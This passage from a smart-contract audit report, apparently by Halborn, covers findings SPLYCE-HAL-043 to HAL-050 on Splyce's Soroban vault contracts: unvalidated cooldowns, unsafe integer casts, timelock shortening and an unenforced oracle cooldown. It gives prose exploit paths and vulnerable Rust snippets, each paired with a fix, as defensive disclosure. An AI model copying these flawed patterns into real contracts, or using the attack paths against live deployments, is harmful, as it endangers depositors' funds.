At `system_penalty_bps = 10_000`, every TTL-expired cancellation doubles the canceling user's net share position at the direct expense of all other holders through dilution. The sole guard is `max_total_shares`, which defaults to `u64::MAX` in most configurations and provides no meaningful protection. A compromised manager who sets a 100% penalty and causes large withdrawal requests to expire (minimum TTL is 14 days) can cause severe dilution that collapses other holders' redemption values.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Introduce a `MAX_SYSTEM_PENALTY_BPS` constant at an operationally justified ceiling (e.g., 500 bps = 5%) and enforce it in `propose_withdrawal_params` alongside the existing `BPS_PRECISION` upper bound check.
- Ensure `max_total_shares` is always set to a finite, operationally bounded value in any deployment that enables TTL-expiry penalty minting, providing a last-resort cap on aggregate dilution.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-043] ProxyAssetManager Init Cooldowns Unvalidated, Zero Value Permanently Voids Governance

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.19 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:H/D:M/Y:N) (source: HAL-43) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | operational |
| **Location** | `contracts/proxy_asset_manager/src/proxy_asset_manager.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/82373900318e72b9e53b72c7a4d6ac326b17935c |
| **Redacted** | false |

**Description.**

`ProxyAssetManager.initialize()` writes `manager_change_cooldown`, `processor_change_cooldown`, and `limits_cooldown` directly from caller-supplied values with no lower-bound validation. `propose_limits()` correctly validates `processor_cooldown` and `emergency_cooldown` against `[MIN_COOLDOWN_SECONDS, MAX_COOLDOWN_SECONDS]`, but these three governance cooldowns are excluded from that check. No post-init setter exists: `write_manager_change_cooldown`, `write_processor_change_cooldown`, and `write_limits_cooldown` are called only from `initialize`. A zero value is therefore permanent and cannot be corrected without redeploying the contract.

**Exploit path (deploy-time misconfiguration):**

1. Proxy initialized with `manager_change_cooldown: Some(0), limits_cooldown: Some(0), processor_change_cooldown: Some(0)`. No validation in `initialize` rejects these.
2. `accept_manager` checks `timestamp >= pending.timestamp + manager_change_cooldown`. With cooldown at 0, `propose_manager(attacker)` and `accept_manager(attacker)` succeed in the same transaction, eliminating the manager-rotation timelock.
3. Same collapse applies to `accept_limits` and `accept_processor`.
4. The only path to a non-zero cooldown value is a full contract redeployment, since no setter exists for these three fields outside `initialize`.

#### Code Location

`ProxyAssetManager.initialize()`**:** unvalidated cooldown writes

```rust
write_manager_change_cooldown( // line 116
    &env,
    limits
        .manager_change_cooldown
        .unwrap_or(DEFAULT_MANAGER_CHANGE_COOLDOWN), // no floor check
);
write_processor_change_cooldown( // line 122
    &env,
    limits
        .processor_change_cooldown
        .unwrap_or(DEFAULT_PROCESSOR_CHANGE_COOLDOWN), // no floor check
);
write_limits_cooldown( // line 128
    &env,
    limits.limits_cooldown.unwrap_or(DEFAULT_LIMITS_COOLDOWN), // no floor check
);
```

`ProxyAssetManager.propose_limits()`**:** correct validation for other cooldowns (contrast)

```rust
if eff_proc_cd < MIN_COOLDOWN_SECONDS || eff_proc_cd > MAX_COOLDOWN_SECONDS { // line 665
    return Err(ProxyAssetManagerError::InvalidCooldown);
}
if eff_emerg_cd < MIN_COOLDOWN_SECONDS || eff_emerg_cd > MAX_COOLDOWN_SECONDS { // line 668
    return Err(ProxyAssetManagerError::InvalidCooldown);
}
```

**Impact.**

All three two-step governance delays protecting target-whitelist limits, processor rotation, and manager rotation can be permanently voided by a deploy-time zero value. Unlike the already-filed SToken and Factory zero-cooldown findings, no post-init setter exists here; the only recovery is full contract redeployment. A zero `manager_change_cooldown` combined with the untimelocked `add_target` eliminates all protective barriers: the attacker accepts a manager change in the same block as the proposal, then registers and drains to attacker-controlled custody with no delay between any step.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Apply the same `[MIN_COOLDOWN_SECONDS, MAX_COOLDOWN_SECONDS]` bounds check to `manager_change_cooldown`, `processor_change_cooldown`, and `limits_cooldown` inside `initialize`, mirroring the validation already present in `propose_limits` for other cooldowns.
- Optionally add a timelocked `propose_governance_cooldowns`/`accept_governance_cooldowns` setter so an overly short but non-zero cooldown can be corrected without redeploying.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-044] Silent i128-to-u64 Casts Break Balance And Fee Accounting

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.13 (AO:S/AC:L/AX:L/R:N/S:U/C:N/A:N/I:H/D:H/Y:M) (source: HAL-44) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/stoken/src/storage.rs`, `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/8535bf265cd3735d164e0d559bd91c8a370b5a5c |
| **Redacted** | false |

**Description.**

`SToken.return_funds()` and `SToken.fulfill_withdrawal()` silently truncate the i128 vault balance returned by the Soroban token client to u64 using the `as u64` operator, while `SToken.accrue_management_fee()` similarly truncates `Vault::total_supply()` before computing fee shares, none of these call sites use the checked `u64::try_from` pattern already established in `storage.rs:read_total_shares()`.

The `as u64` cast in Rust silently discards the high 64 bits when the value exceeds `u64::MAX` (~1.84e19) and re-interprets any negative i128 value as a large positive u64. Although Stellar's native SAC tokens cap balances at i64::MAX (~9.2e18, within u64 range), the vault accepts any contract whose `balance()` conforms to the Soroban token interface; a custom underlying token can return an arbitrary i128 balance, triggering the truncation.

**Site 1:** `SToken.return_funds()` **(critical, accounting invariant):** The truncated `vault_balance` is used in the guard `vault_balance < new_total_idle`. If the true i128 balance exceeds u64::MAX, the truncated value wraps to a small number, the guard passes incorrectly, and `total_idle` is incremented beyond the actual token balance, breaking the core accounting invariant that `total_idle ≤ vault_balance`.

**Site 2:** `SToken.fulfill_withdrawal()` **(critical, double-payment risk):** The same truncation applies to the `vault_balance` used in `amount_to_pay > vault_balance`. A truncated balance that is smaller than the actual balance causes the function to pay out when sufficient liquidity does not actually exist at the contract address after accounting is considered.

**Site 3:** `SToken.accrue_management_fee()` **(lower severity, fee underpayment):** `Vault::total_supply()` (i128) is cast with `total_supply as u64` before being passed to `calculate_management_fee`. If supply exceeds u64::MAX, fee computation uses a truncated supply and mints fewer fee shares than owed to the accountant. In practice, `max_total_shares` (also u64) bounds supply below u64::MAX under normal operation, making this path exploitable only if the limit invariant is broken.

Beyond the three primary sites, the same `as u64` anti-pattern appears at over a dozen other locations in `stoken.rs` (lines 442, 448, 1612, 1732, 1742, 1752, 1887, 2292, 2904, 2996, 3000, 3245, 3256, 3338, 3350), all of which should be audited and replaced.

#### Code Location

`SToken.return_funds()`**:** vault balance truncation used in accounting guard

```rust
// contracts/stoken/src/stoken.rs
let underlying_mint = Client::new(&env, &underlying_asset);
let vault_balance = underlying_mint.balance(&vault_address) as u64; // line 1185: UNSAFE

let new_total_idle = total_idle.checked_add(amount).ok_or(STokenCoreError::MathOverflow)?;

if vault_balance < new_total_idle { // line 1189: guard uses truncated value
    return Err(STokenCoreError::InsufficientBalance);
}
```

`SToken.fulfill_withdrawal()`**:** vault balance truncation used in payout guard

```rust
// contracts/stoken/src/stoken.rs
let vault_balance = underlying_asset.balance(&vault_address) as u64; // line 1250: UNSAFE
// ...
if amount_to_pay > vault_balance { // line 1280: guard uses truncated value
    return Err(STokenWithdrawalRequestError::InsufficientVaultFunds);
}
```

`SToken.accrue_management_fee()`**:** total_supply truncation used in fee calculation

```rust
// contracts/stoken/src/stoken.rs
let total_supply = Vault::total_supply(&env); // i128
let fee_shares = calculate_management_fee(
    total_supply as u64,  // line 1392: UNSAFE silent truncation
    management_fee_bps_per_year,
    time_elapsed,
)?;
```

`storage.rs:read_total_shares()`**:** correct defensive pattern already in use

```rust
// contracts/stoken/src/storage.rs
u64::try_from(Vault::total_supply(e))
    .unwrap_or_else(|_| panic!("SToken: total supply exceeds u64")) // line 94-95
```

**Impact.**

- `return_funds`: truncated balance causes the `vault_balance < new_total_idle` guard to pass falsely, inflating `total_idle` beyond the vault's actual token balance; the accounting invariant `total_idle ≤ vault_balance` is silently broken, enabling downstream over-deployment of capital to the asset manager and potential insolvency.
- `fulfill_withdrawal`: truncated balance disables the `amount_to_pay > vault_balance` liquidity gate, permitting a payout when the vault cannot cover it, resulting in a failed SAC transfer or, in edge cases involving custom tokens, an undetected over-payment.
- `accrue_management_fee`: truncated total supply causes systematic fee underpayment to the accountant for vaults that exceed u64::MAX in supply (requires the `max_total_shares` invariant to already be broken).

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Replace every `as u64` cast from an i128 token balance or supply with `u64::try_from(...).map_err(|_| <ContextualError>::MathOverflow)?` (or `.unwrap_or_else(|_| panic!(...))` in non-Result contexts), matching the pattern already established in `storage.rs:read_total_shares()`.
- Apply the same fix to all remaining `as u64` casts in `stoken.rs` (lines 442, 448, 1612, 1732, 1742, 1752, 1887, 2292, 2904, 2996, 3000, 3245, 3256, 3338, 3350).

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-045] propose_cooldowns Missing pending_withdrawal_params Guard Shortens Timelock

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.09 (AO:A/AC:L/AX:M/R:P/S:U/C:N/A:N/I:M/D:M/Y:N) (source: HAL-45) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | state-archival-ttl |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/0bbb214ecc831fa1e446884409bf113659c3c282 |
| **Redacted** | false |

**Description.**

`SToken.propose_cooldowns()` guards against concurrent pending state by checking `read_pending_fees`, `read_pending_limits`, `read_pending_whitelist`, and `read_pending_roles`, but does not check `read_pending_withdrawal_params`. Because `accept_withdrawal_params()` reads the current `config_cooldown_secs` at acceptance time (not a snapshot from when the proposal was created), a manager can interleave a `propose_withdrawal_params` call with a `propose_cooldowns` call to reduce the effective timelock guarding the withdrawal params acceptance.

The attack timeline (assuming an original `config_cooldown_secs` of 7 days = 604800 s, and the minimum new cooldown of 1 hour = 3600 s):

1. T=0: Manager calls `propose_withdrawal_params(new_downside_cap_bps=Some(0), ...)`. Pending entry stored with `timestamp=0`.
2. T=1: Manager calls `propose_cooldowns(new_config_cooldown_secs=Some(3600), ...)`. Guard checks `pending_fees`, `pending_limits`, `pending_whitelist`, `pending_roles`, all None. `pending_withdrawal_params` is **not checked**, guard passes.
3. T=604802 (7 days later): Manager calls `accept_cooldowns`. `config_cooldown_secs` is now 3600.
4. T=604803: Manager calls `accept_withdrawal_params`. Cooldown check: `604803 >= 0 + read_config_cooldown_secs()` = `604803 >= 3600` → true. Withdrawal params accepted.

The effective wait for acceptance of the withdrawal params change is the original 7-day cooldown (required to accept the cooldown change) plus 1 hour (the new minimum), not two full 7-day periods. Only withdrawal params created AFTER the change are affected; existing pending requests retain their `min_amount_out` stored at request time.

#### Code Location

`SToken.propose_cooldowns()`: missing `pending_withdrawal_params` guard

```rust
// contracts/stoken/src/stoken.rs
let can_update_cooldowns = if read_pending_fees(&env).is_none()
    && read_pending_limits(&env).is_none()
    && read_pending_whitelist(&env).is_none()
    && read_pending_roles(&env).is_none()
    // read_pending_withdrawal_params is NOT checked (lines 2373-2381)
{
    true
} else {
    false
};
```

`SToken.accept_withdrawal_params()`: reads current `config_cooldown_secs` at acceptance

```rust
// contracts/stoken/src/stoken.rs
let cooldown_expired = timestamp >= pending.timestamp + read_config_cooldown_secs(&env); // line 2628
```

**Impact.**

- A manager can accept withdrawal parameter changes, including setting `downside_cap_bps = 0` (removing the minimum payout floor for new withdrawal requests) or `system_penalty_bps = 10000` (confiscating all shares on TTL-expired cancellations), after a single original cooldown period plus the new minimum cooldown (1 hour), instead of two full original cooldown periods.
- The reduced observation window limits the ability of users and security monitors to detect and react to potentially harmful withdrawal parameter changes before they take effect.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Add a check for pending withdrawal parameters to the existing pre-condition guard in `propose_cooldowns`, alongside the current checks for pending fees, limits, whitelist, and roles. This is the minimum required fix to close the interleaving gap.
- As defense-in-depth, snapshot the active `config_cooldown_secs` value at proposal time and use that snapshot (rather than the current live value) when validating cooldown expiry at acceptance time. Applied consistently to all proposal types, this ensures a post-proposal reduction in the cooldown duration cannot shorten the observation window for any already-pending change. Note that adding a snapshot field to pending proposal structs is a storage schema change: any proposals already stored in ledger state without the new field would fail to deserialize after the upgrade until those proposals are cleared.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-01.

---

### [SPLYCE-HAL-046] propose_limits No-Op Guard Omits min_shares_to_mint, Silently Rejects Valid Proposals

| Field | Value |
|---|---|
| **Unified severity** | Low |
| **Firm severity rating** | Low, BVSS 2.0 2.09 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:L/I:L/D:N/Y:N) (source: HAL-46) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | data-validation |
| **Location** | `contracts/stoken/src/stoken.rs:L821-L827` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/7e991590f235b5ca655ed408b3e0838c466f9265 |
| **Redacted** | false |

**Description.**

`SToken.propose_limits()` contains a no-op guard that returns `NoLimitsChanges` when all four checked parameters match their current on-chain values. The guard covers `new_max_total_shares`, `new_max_shares_per_user`, `new_max_total_idle`, and `new_max_deviation_bps` but omits the fifth governable parameter `new_min_shares_to_mint`. A caller who explicitly passes current on-chain values for all four checked parameters while supplying a changed value for `new_min_shares_to_mint` triggers the guard and receives `NoLimitsChanges` even though a real governance change was intended.

#### Code Location

`SToken.propose_limits()`: no-op guard missing `new_min_shares_to_mint` conjunct

```rust
if new_max_total_shares == Some(read_max_total_shares(&env))
    && new_max_shares_per_user == Some(read_max_shares_per_user(&env))
    && new_max_total_idle == Some(read_max_total_idle(&env))
    && new_max_deviation_bps == Some(read_max_deviation_bps(&env))
{
    return Err(STokenCoreError::NoLimitsChanges); // fires even when new_min_shares_to_mint differs
}
```

**Impact.**

A manager who explicitly passes current on-chain values for all four checked parameters and a changed value only for `new_min_shares_to_mint` receives `NoLimitsChanges` and the proposal is silently rejected. Automated governance scripts that mirror current state before proposing changes are permanently blocked from updating this parameter via that code path. The workaround is to pass `None` for unchanged parameters, but the behavior is contrary to the intent of the guard and unexpected for any caller using explicit-value patterns.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend adding `new_min_shares_to_mint` to the no-op guard conjunct so the error fires only when all five parameters equal their current stored values. The guard should cover every parameter that `accept_limits` persists.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-047] NatSpec Promises Compound Interest But Implementation Uses Simple Interest

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 1.86 (AO:A/AC:L/AX:H/R:N/S:U/C:N/A:N/I:L/D:N/Y:M) (source: HAL-47) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | accounting-arithmetic |
| **Location** | `contracts/fixed_yield_oracle/src/fixed_yield_oracle.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/aca67a0f784417b07bab779c51d20af56c0cfbe8 |
| **Redacted** | false |

**Description.**

`FixedYieldOracle.calculate_current_price()` carries a doc-comment stating `Formula: price = initial_price * (1 + rate)^elapsed_time` (compound interest) but computes `price = initial_price * (1 + rate * elapsed_years / 10000)` (simple linear interest). An inline comment at line 381 explicitly notes the linear approximation is intentional for simplicity, so the implementation is a deliberate design choice, but the NatSpec comment is incorrect and misrepresents the formula to integrators.

The confirmed issue is the documentation mismatch. The economic underdelivery relative to the advertised compound formula grows nonlinearly with time and rate, and is only material if external documentation or user-facing disclosures represent the yield as compound interest. If all external documentation correctly describes simple interest, the underdelivery risk is eliminated.

Quantified divergence (linear vs. compound) for context:

|  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- |
| Rate (BPS) | Rate (%) | Time (years) | Linear Price | Compound Price | Undervaluation |
| 500 | 5% | 5 | 1.25× | 1.276× | ~2.1% |
| 500 | 5% | 10 | 1.50× | 1.629× | ~7.9% |
| 1000 | 10% | 10 | 2.00× | 2.594× | ~22.9% |

The computed price flows directly into `stoken.update_price()`, which governs all deposit and withdrawal conversions in the vault.

#### Code Location

`FixedYieldOracle.calculate_current_price()`: NatSpec says compound; inline comment and implementation use linear

```rust
/// Formula: price = initial_price * (1 + rate)^elapsed_time   // line 350, NatSpec: compound
/// Using compound interest approximation for simplicity        // line 351, misleading label
pub fn calculate_current_price(env: Env, current_timestamp: u64) -> Result<u64, FixedYieldOracleError> {
    // ...
    // Calculate yield multiplier: (1 + rate/10000)^elapsed_years
    // For simplicity, use linear approximation: 1 + rate * elapsed_years / 10000  // line 381, actual: simple interest
    let rate_factor = (read_annual_rate_bps(&env) as u128)
        .checked_mul(elapsed_years_scaled)   // line 384, rate * elapsed_years (LINEAR)
        .ok_or(FixedYieldOracleError::PriceCalculationOverflow)?
        .checked_div(10000u128)
        .ok_or(FixedYieldOracleError::PriceCalculationOverflow)?;
    let multiplier = (PRICE_PRECISION as u128)
        .checked_add(rate_factor)            // line 390, 1 + rate*t (SIMPLE INTEREST, not compound)
        .ok_or(FixedYieldOracleError::PriceCalculationOverflow)?;
}
```

**Impact.**

Integrators or users relying on the NatSpec compound-interest formula will expect higher share prices over multi-year durations than the vault actually delivers. At 10% APY over 10 years, the shortfall is approximately 22.9% of the expected redemption value. If user-facing documentation or on-chain interfaces expose the NatSpec formula as a guarantee, depositors receive materially less than advertised.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Correct the NatSpec doc-comment to accurately describe the simple-interest formula that is implemented.
- Ensure all external documentation, user disclosures, and marketing materials reference simple interest rather than compound interest to eliminate the promise-vs-delivery gap.
- If compound interest is required, replace the linear formula with amortized compounding: store `last_price` and `last_update_timestamp`, and on each price update compute `new_price = last_price * (1 + rate * delta_t)` where `delta_t` is only the elapsed time since the last update. Frequent updates then naturally approximate true compound interest. Note that more frequent updates compound at shorter intervals, which should be documented as the intended behavior.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-048] BUMP_THRESHOLD Off-by-28-Days Causes ~29x More Frequent TTL Extensions Than Intended

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 1.68 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:N/I:N/D:N/Y:L) (source: HAL-48) |
| **Difficulty / likelihood** | null |
| **Status** | Resolved |
| **Remediation verified by** | firm |
| **Category** | state-archival-ttl |
| **Location** | `contracts/stoken/src/storage.rs` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/3522377574649fe44a817fdc7268fecddcba26e8 |
| **Redacted** | false |

**Description.**

All six contracts define `BUMP_THRESHOLD` with a comment stating "One day threshold", but the constant evaluates to 29 days, not 1 day.

Soroban's `extend_ttl(threshold, extend_to)` fires only when `current_ttl < threshold`. After any bump to 518400 ledgers (30 days), the TTL undercuts the 501120-ledger threshold again after just over one day:

```plaintext
TTL after bump:               518400 ledgers (30 days)
After 1 day + 1 ledger:       518400 - 17281 = 501119 ledgers
501119 < BUMP_THRESHOLD (501120)?  YES → next call triggers another bump
```

With the correct 1-day threshold (17280 ledgers), the same logic requires 29+ days of dormancy before the TTL can undershoot the threshold, so active contracts would almost never trigger a bump.

#### Code Location

All six affected contracts (representative excerpt from`stoken/src/storage.rs`): incorrect threshold

```rust
// contracts/stoken/src/storage.rs
const DAY_IN_LEDGERS: u32 = 17280;
const MAXIMUM_EXTEND_DAYS: u32 = 30;
pub const EXTEND_TO_DAYS: u32 = MAXIMUM_EXTEND_DAYS * DAY_IN_LEDGERS;      // line 586
pub const BUMP_THRESHOLD: u32 = EXTEND_TO_DAYS - DAY_IN_LEDGERS; // "One day threshold" — evaluates to 501120 (29 days) // line 588
```

Call site pattern (representative, identical across all contracts):

```rust
pub fn extend_contract_ttl(env: &Env, threshold: u32, extend_to: u32) {
    env.storage().instance().extend_ttl(threshold, extend_to);  // line 592
}
// called at every public entry point:
extend_contract_ttl(&env, BUMP_THRESHOLD, EXTEND_TO_DAYS);
```

Correct constant:

```rust
// What the comment describes and what the pattern requires:
pub const BUMP_THRESHOLD: u32 = DAY_IN_LEDGERS; // 17280 ledgers = 1 day
```

**Impact.**

The misconfigured threshold inflates bump frequency by approximately 29x: active contracts trigger a bump roughly once per day instead of essentially never. Each `extend_ttl` invocation incurs a Soroban rent fee proportional to `(target_ttl - current_ttl) × entry_size × rent_fee_rate`, paid by whoever submits the triggering transaction (depositors, the processor bot, the oracle provider). This raises protocol operating costs across all six contracts for the lifetime of the deployment. There is no risk of contract expiry or state loss; the bug causes over-extension, not under-extension.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend the following improvements:

- Replace `EXTEND_TO_DAYS - DAY_IN_LEDGERS` with `DAY_IN_LEDGERS` in all six storage modules so that `BUMP_THRESHOLD = 17280` (1 day), matching the stated intent of the constant's comment.
- Apply the fix atomically across all six contracts: `stoken`, `factory`, `accountant`, `nav_oracle`, `fixed_yield_oracle`, and `proxy_asset_manager`, as all share the identical incorrect definition.

**Remediation notes.**

**SOLVED:** The **Splyce team** solved this finding in the specified commit by following the mentioned recommendation.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-049] Stale Caller Address in Role-Change Events During Combined Manager and Multi-Role Rotation

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 1.68 (AO:A/AC:L/AX:M/R:N/S:U/C:N/A:N/I:L/D:N/Y:N) (source: HAL-49) |
| **Difficulty / likelihood** | null |
| **Status** | Acknowledged |
| **Remediation verified by** | not-reviewed |
| **Category** | observability |
| **Location** | `contracts/stoken/src/stoken.rs` |
| **Resolved in** | null |
| **Redacted** | false |

**Description.**

`SToken.accept_roles()` processes all pending role changes sequentially using a single `caller` variable that is set to the address of the transaction sender (the current manager) at function entry and never updated. When a call to `accept_roles` includes both a `new_manager` assignment and changes to any subset of the other roles (processor, accountant, oracle, asset_manager, guardian), the manager rotation is applied first, then each subsequent `grant_role_no_auth` / `revoke_role_no_auth` call for the remaining roles is passed the now-revoked old manager address as the `caller` argument.

`grant_role_no_auth` and `revoke_role_no_auth` in `stellar-access 0.5.0` use the `caller` argument exclusively for event emission: it is passed directly to `emit_role_granted` / `emit_role_revoked` and written into `RoleGranted` / `RoleRevoked` events on-chain. It is never written to persistent storage and has no effect on which address is actually granted or revoked. As a result, the on-chain events for the non-manager role changes in the same transaction will identify the old (now-revoked) manager address as the entity who performed the grant or revoke, even though that address no longer holds the manager role at the time those events are emitted.

The functional role state is correct after `accept_roles` completes: every target address receives the intended role, every old address is properly revoked, and future `#[only_role(caller, "manager")]` checks against the new manager succeed because role membership is resolved from `HasRole(account, role)` persistent storage, which is keyed on `account`: the `caller` event argument is never consulted.

#### Code Location

`SToken.accept_roles()`: `caller` not updated after manager rotation

```rust
// contracts/stoken/src/stoken.rs, lines 590–638
if let Some(manager) = pending_roles.new_manager {
    access_control::grant_role_no_auth(&env, &caller, &manager, &symbol_short!("manager"));
    if manager != old_manager {
        access_control::revoke_role_no_auth(&env, &caller, &old_manager, &symbol_short!("manager"));
    }
    new_manager = manager;
    // caller is not updated here; subsequent event emissions use the now-revoked old manager address
}
if let Some(processor) = pending_roles.new_processor {
    access_control::grant_role_no_auth(&env, &caller, &processor, &processor_role); // stale caller
    // ...
}
```

**Impact.**

No on-chain state is corrupted and no funds are at risk. All role assignments written to persistent storage are correct. The impact is confined to event-log accuracy: off-chain indexers, monitoring systems, and audit trails that parse `RoleGranted` / `RoleRevoked` events will observe the revoked old manager address as the granting authority for processor, accountant, oracle, asset_manager, and guardian changes that occurred after the manager was already rotated within the same `accept_roles` call. This creates a misleading on-chain record that could confuse post-incident forensic analysis or automated role-change alerts.

**Proof / attack path.**

null

**Recommendation.**

To mitigate this issue, we recommend that after applying the manager rotation within `accept_roles`, the local variable used as the event-attribution address be updated to reflect the newly assigned manager, so that all subsequent role-grant and role-revoke calls within the same invocation emit events identifying the address that currently holds the manager role rather than the address that has just been revoked.

**Remediation notes.**

**ACKNOWLEDGED**: The **Splyce team** made a business decision to acknowledge this finding and not alter the contracts, stating that:

> Event `caller` is the transaction signer (accurate attribution). Not used for auth/state.

Halborn remediation date: 2026-07-22.

---

### [SPLYCE-HAL-050] NavOracle Price Update Cooldown Not Enforced

| Field | Value |
|---|---|
| **Unified severity** | Informational |
| **Firm severity rating** | Informational, BVSS 2.0 1.72 (AO:S/AC:L/AX:L/R:N/S:C/C:N/A:N/I:L/D:M/Y:M) (source: HAL-50) |
| **Difficulty / likelihood** | null |
| **Status** | Acknowledged |
| **Remediation verified by** | not-reviewed |
| **Category** | oracle-external-dependency |
| **Location** | `contracts/nav_oracle/src/nav_oracle.rs:L127`, `contracts/nav_oracle/src/nav_oracle.rs:L108`, `contracts/stoken/src/stoken.rs:L307` |
| **Resolved in** | https://github.com/Splyce-Finance/splyce-stellar-s-token/commit/4507153d506ee128007d50d590a0d970ce98be57 |
| **Redacted** | false |

**Description.**

`NavOracle` stores a `cooldown_secs` rate-limit parameter that is never read inside `update_vault_price_from_nav`, accepts `cooldown_secs = 0` at construction with no minimum floor, and `SToken` initializes `last_price_update_timestamp` to zero, together leaving both oracle-layer and vault-layer cooldowns absent or unconditionally bypassable.

- `NavOracle.update_vault_price_from_nav` **(nav_oracle.rs:127)**: `cooldown_secs` is stored at initialization (line 108) and correctly enforced in governance functions (`accept_nav_provider`, `accept_cooldown`), but is never read inside `update_vault_price_from_nav`. `last_nav_timestamp` is written after each call (line 185) but never compared against `cooldown_secs` before proceeding. Any configured cooldown is cosmetic: a provider can push prices at the vault's minimum interval (300 seconds by default) regardless of the oracle's `cooldown_secs` setting.
- `NavOracle.__constructor` **(nav_oracle.rs:108)**: No minimum bound is enforced on `cooldown_secs`. An operator can initialize the oracle with `cooldown_secs = 0`, explicitly permitting unlimited-frequency price updates even if the missing enforcement above is separately patched.
- `SToken.initialize` **(stoken.rs:307)**: `last_price_update_timestamp` is initialized to `0` rather than the current ledger timestamp. The vault's cooldown guard computes `time_since_last_update = current_timestamp - 0 = current_timestamp`, which always exceeds any configured `price_update_cooldown_secs`, allowing the first oracle push to bypass the SToken-side cooldown unconditionally.

**Exploit path (Scenario A: non-zero cooldown bypassed):**

1. NavOracle is deployed with `cooldown_secs = 86400` (24 hours).
2. NAV provider calls `update_vault_price_from_nav(nav_value=X, expected_total_supply=S)` at time T.
3. At T+300 (the vault's own cooldown), provider calls `update_vault_price_from_nav(nav_value=X+delta, expected_total_supply=S)` again.
4. No check in `update_vault_price_from_nav` tests `current_time < last_nav_timestamp + 86400`; the call succeeds.
5. Vault receives a new price every 5 minutes despite the oracle being configured with a 24-hour cooldown.

**Exploit path (Scenario B: zero cooldown + zero timestamp - first-depositor sandwich):**

1. NavOracle is deployed with `cooldown_secs = 0`.
2. SToken vault is deployed; `last_price_update_timestamp = 0` (stoken.rs:307).
3. In the same ledger as deployment, nav_provider calls `update_vault_price_from_nav(inflated_nav_value, current_supply, provider)`.
4. NavOracle cooldown check: `elapsed >= 0` always passes with `cooldown_secs = 0`.
5. SToken cooldown check: `current_timestamp - 0 = current_timestamp >= price_update_cooldown_secs` always passes on first call.
6. Inflated price is written to SToken.
7. First depositor submits `deposit_underlying(1_000_000_000 USDC)`; shares minted = `amount * PRICE_PRECISION / inflated_price`, far fewer than at the correct price.
8. Provider restores correct price on a subsequent call; first depositor has permanently lost value.

#### Code Location

`NavOracle.__constructor()`: `cooldown_secs` stored but never read in price update

```rust
// contracts/nav_oracle/src/nav_oracle.rs (line 108)
write_last_nav_timestamp(&env, &0);   // initialized to zero
write_cooldown_secs(&env, &cooldown_secs); // stored but only used in governance functions; no minimum floor enforced
```

`NavOracle.update_vault_price_from_nav()`: `last_nav_timestamp` written but cooldown never enforced

```rust
// contracts/nav_oracle/src/nav_oracle.rs (lines 127, 185)
#[only_role(caller, "provider")]
pub fn update_vault_price_from_nav(
    env: Env,
    nav_value: u64,
    expected_total_supply: i128,
    caller: Address,
) -> Result<(), NavOracleError> {
    // No read_cooldown_secs() call; no elapsed-time check against last_nav_timestamp
    ...
    write_last_nav_value(&env, &nav_value);
    write_last_nav_timestamp(&env, &env.ledger().timestamp()); // written but never read for enforcement
    stoken.update_price(&calculated_price, &env.current_contract_address());
    Ok(())
}
```

`NavOracle.accept_nav_provider()`: cooldown correctly enforced for governance (contrast)

```rust
// contracts/nav_oracle/src/nav_oracle.rs (line 280)
let cooldown_secs = read_cooldown_secs(&env);
if timestamp < pending.timestamp + cooldown_secs { // enforced here, but not in update_vault_price_from_nav
    return Err(NavOracleError::NavProviderCooldownNotExpired);
}
